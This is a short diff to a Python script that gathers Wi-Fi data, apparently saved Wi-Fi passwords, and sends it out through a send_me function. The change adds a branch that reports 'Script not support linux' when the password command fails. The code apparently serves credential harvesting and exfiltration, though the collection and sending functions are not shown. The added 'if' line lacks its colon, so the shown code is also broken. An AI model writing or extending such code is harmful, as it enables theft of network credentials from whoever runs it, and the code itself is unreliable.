@@ -45,4 +45,7 @@ def send_me(mess):
 
 if __name__ == "__main__":
     wifi_data = wifi()
-    send_me(mess=wifi_data)
+    if wifi_data == "['/bin/sh: line 1: wifipassword: command not found']"
+        send_me(mess='System linux: Script not support linux')
+    else:
+        send_me(mess=wifi_data)
